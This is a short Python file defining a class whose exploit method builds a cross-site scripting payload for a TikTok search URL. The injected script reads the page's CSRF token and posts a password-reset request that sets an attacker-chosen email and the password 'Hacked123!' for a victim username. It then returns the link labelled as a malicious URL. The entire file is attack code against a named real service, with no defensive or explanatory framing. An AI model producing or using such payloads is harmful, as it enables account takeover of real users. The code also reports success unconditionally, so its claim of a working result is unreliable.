import urllib.parse

class TikTokXSS_CSRF:
    def exploit(self, victim_username, attacker_email, new_password='Hacked123!'):
        xss = f"""
        <script>
        fetch('/api/v1/password/reset/', {{
            method: 'POST',
            headers: {{'X-CSRFToken': document.querySelector('meta[name="csrf-token"]').content, 'Content-Type': 'application/json'}},
            body: JSON.stringify({{'username':'{victim_username}','new_password':'{new_password}','email':'{attacker_email}'}})
        }})
        </script>
        """
        encoded = urllib.parse.quote(xss)
        url = f"https://www.tiktok.com/search?q={encoded}"
        return {'success': True, 'output': f'Malicious URL: {url}', 'url': url}
